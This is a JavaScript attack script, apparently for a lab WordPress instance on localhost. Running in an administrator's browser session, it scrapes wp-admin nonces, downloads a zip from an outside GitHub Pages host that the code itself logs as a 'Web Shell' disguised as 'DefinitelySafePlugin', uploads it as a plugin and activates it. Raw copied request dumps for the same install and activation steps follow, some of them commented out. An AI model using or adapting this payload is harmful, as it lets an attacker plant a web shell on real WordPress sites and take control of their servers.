function addPlugin() {
    const pluginName = "DefinitelySafePlugin";

    // 1- fetch the plugin-installation wpnonce
    fetch("http://localhost:8000/wp-admin/plugin-install.php", {
        credentials: "include",
    })
    .then(res => res.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');

        const nonceContainer = doc.querySelector("form.wp-upload-form[action*='upload-plugin'] input[type='hidden']#_wpnonce[name='_wpnonce']");
        const installation_wpNonce = nonceContainer?.getAttribute("value");

        if (!installation_wpNonce) {
            console.warn("Plugin addition nonce not found");
            return;
        }

        // 2 - install the plugin
        const zipUrl = `https://arian-lrd.github.io/resources/${pluginName}.zip`;

        fetch(zipUrl)
        .then(r => r.blob())
        .then(zipBlob => {
            console.log(`Web Shell ${pluginName} retrieved successfully`);

            const form = new FormData();
            form.append('_wpnonce', installation_wpNonce);
            form.append('pluginzip', zipBlob, `${pluginName}.zip`);
            form.append('install-plugin-submit', 'Install Now');

            return fetch("http://localhost:8000/wp-admin/update.php?action=upload-plugin", {
                credentials: 'include',
                method: 'POST',
                body: form
            });
        })
        .then(() => {
            console.log(`${pluginName} was installed successfully`);

            // 3 - fetch the activation nonce
            return fetch("http://localhost:8000/wp-admin/plugins.php", {
                credentials: 'include'
            });
        })
        .then(res => res.text())
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');

            const nonceContainer = doc.querySelector(`tr[data-plugin='${pluginName}/${pluginName}.php'] td span a`);
            const activation_wpNonce = nonceContainer?.getAttribute("href").split('_wpnonce=')[1]?.substring(0, 10);

            if (!activation_wpNonce) {
                console.warn(`Activation nonce for ${pluginName} not found`);
                return;
            }

            // 4 - Activate the plugin
            return fetch(`http://localhost:8000/wp-admin/plugins.php?action=activate&plugin=${pluginName}%2F${pluginName}.php&_wpnonce=${activation_wpNonce}`, {
                credentials: 'include'
            });
        })
        .then(() => {
            console.log(`${pluginName} was activated successfully`);
        });
    });
}

addPlugin();



// // 3- activation - from upload page
await fetch("http://localhost:8000/wp-admin/plugins.php?action=activate&plugin=wpWebShell-plugin1.5%2FwpWebShell.php&_wpnonce=5b52482f5f", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    },
    "referrer": "http://localhost:8000/wp-admin/update.php?action=upload-plugin",
    "method": "GET",
    "mode": "cors"
});




// // 3 - activation - from plugins page
await fetch("http://localhost:8000/wp-admin/plugins.php?action=activate&plugin=wpWebShell-plugin1.5%2FwpWebShell.php&plugin_status=all&paged=1&s&_wpnonce=5b52482f5f", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    },
    "referrer": "http://localhost:8000/wp-admin/plugins.php?plugin_status=all&paged=1&s",
    "method": "GET",
    "mode": "cors"
});






//1- url: http://localhost:8000/wp-admin/plugin-install.php
// wpnonce: <form method="post" enctype="multipart/form-data" class="wp-upload-form" action="http://localhost:8000/wp-admin/update.php?action=upload-plugin">
// 	       <input type="hidden" id="_wpnonce" name="_wpnonce" value="17c5e064fa"><input type="hidden" name="_wp_http_referer" value="/wp-admin/plugin-install.php">	

// 1 - install plugin
await fetch("http://localhost:8000/wp-admin/update.php?action=upload-plugin", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary759f90eb0559014db699ebeb5b7ba3b9",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    }})
    //"referrer": "http://localhost:8000/wp-admin/plugin-install.php")}
    //"body": "------geckoformboundary759f90eb0559014db699ebeb5b7ba3b9\r\n
    /**
     * Content-Disposition: form-data; name=\"_wpnonce\"\r\n\r\n17c5e064fa \r\n------geckoformboundary759f90eb0559014db699ebeb5b7ba3b9\r\nContent-Disposition: form-data; 
     * name=\"_wp_http_referer\"\r\n\r\n/wp-admin/plugin-install.php \r\n------geckoformboundary759f90eb0559014db699ebeb5b7ba3b9\r\n
     * Content-Disposition: form-data; name=\"pluginzip\"; filename=\"a.zip\"\r\nContent-Type: application/zip\r\n\r\nPK\u0003\u0004\n\u0000\u0000\u0000\u0000\u0000\u0005Z\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0004\u0000\u001c\u0000a.jsUT\t\u0000\u0003º\u0002hº\u0002hux\u000b\u0000\u0001\u0004ö\u0001\u0000\u0000\u0004\u0014\u0000\u0000\u0000PK\u0001\u0002\u001e\u0003\n\u0000\u0000\u0000\u0000\u0000\u0005Z\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0004\u0000\u0018\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000¤\u0000\u0000\u0000\u0000a.jsUT\u0005\u0000\u0003º\u0002hux\u000b\u0000\u0001\u0004ö\u0001\u0000\u0000\u0004\u0014\u0000\u0000\u0000PK\u0005\u0006\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000J\u0000\u0000\u0000>\u0000\u0000\u0000\u0000\u0000\r\n------geckoformboundary759f90eb0559014db699ebeb5b7ba3b9\r\nContent-Disposition: form-data; 
     * name=\"install-plugin-submit\"\r\n\r\nInstall Now\r\n------geckoformboundary759f90eb0559014db699ebeb5b7ba3b9--\r\n",
    "method": "POST",
    "mode": "cors"
    *///})